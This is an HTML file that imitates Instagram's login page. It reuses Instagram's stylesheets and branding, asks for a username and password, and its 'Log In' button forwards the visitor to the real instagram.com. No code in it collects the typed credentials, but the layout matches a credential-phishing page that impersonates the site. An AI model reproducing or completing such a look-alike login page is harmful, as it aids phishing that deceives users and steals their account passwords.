<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <!-- Utilisation de la feuille de style externe d'Instagram -->
    <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.css/58cb1b76a0f7.css">
    <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerLibCommons.css/806c75bc5293.css">
    <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/Consumer.css/20b5e7d27fcf.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <!-- Logo d'Instagram -->
            <svg aria-label="Instagram" class="_8-yf5 " fill="#262626" viewBox="0 0 48 48">
                <path d="M30.3 0H17.7C7.9 0 0 7.9 0 17.7v12.6C0 40.1 7.9 48 17.7 48h12.6c9.8 0 17.7-7.9 17.7-17.7V17.7C48 7.9 40.1 0 30.3 0zm9.5 30.3c0 5.3-4.3 9.6-9.6 9.6H17.7c-5.3 0-9.6-4.3-9.6-9.6V17.7c0-5.3 4.3-9.6 9.6-9.6h12.6c5.3 0 9.6 4.3 9.6 9.6v12.6z"></path>
                <path d="M24 11.7c-4.6 0-8.3 3.7-8.3 8.3s3.7 8.3 8.3 8.3 8.3-3.7 8.3-8.3-3.7-8.3-8.3-8.3zm0 13.2c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5z"></path>
                <path d="M39.6 12.9c-.1-1.1-.3-2.9-.8-4.1-.9-1.8-2.2-3.3-4-4.1-1.2-.6-3.2-1-9.6-1s-8.4.4-9.6 1c-1.8.8-3.2 2.3-4 4.1-.6 1.2-.7 3-1 4.1-1.1 5.5-1.3 7.4-1.3 11.3s.2 5.8 1.3 11.3c.1 1.1.3 2.9.8 4.1.9 1.8 2.2 3.3 4 4.1 1.2.6 3.2 1 9.6 1s8.4-.4 9.6-1c1.8-.8 3.2-2.3 4-4.1.6-1.2.7-3 .9-4.1 1.1-5.5 1.3-7.4 1.3-11.3s-.2-5.8-1.3-11.3zm-7.3 17.7c-4.4 0-7.9-3.6-7.9-7.9s3.6-7.9 7.9-7.9 7.9 3.6 7.9 7.9-3.6 7.9-7.9 7.9z"></path>
                <path d="M35.7 12.5c-.4 0-.8.4-.8.8s.4.8.8.8c1.5 0 2.8 1.2 2.8 2.8s-1.2 2.8-2.8 2.8-.8-.4-.8-.8c0-1.2-1-2.3-2.3-2.3s-2.3 1-2.3 2.3c0 3.5 2.9 6.3 6.3 6.3s6.3-2.9 6.3-6.3-2.9-6.3-6.3-6.3z"></path>
            </svg>
            <form>
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <!-- Correction de la balise button -->
                <button onclick="redirectToNewSite()">Log In</button>
                <div class="divider">
                    <span>OR</span>
                </div>
                <button type="button" class="facebook-login">Log in with Facebook</button>
                <a href="#" class="forgot-password">Forgot password?</a>
            </form>
            <div class="signup">
                <span>Don't have an account? <a href="#">Sign up</a></span>
            </div>
        </div>
        <div class="app-links">
        </div>
    </div>
    <!-- Correction de la position de la balise script -->
    <script>
        function redirectToNewSite() {
            window.location.href = "https://www.instagram.com";
        }
    </script>
</body>
</html>
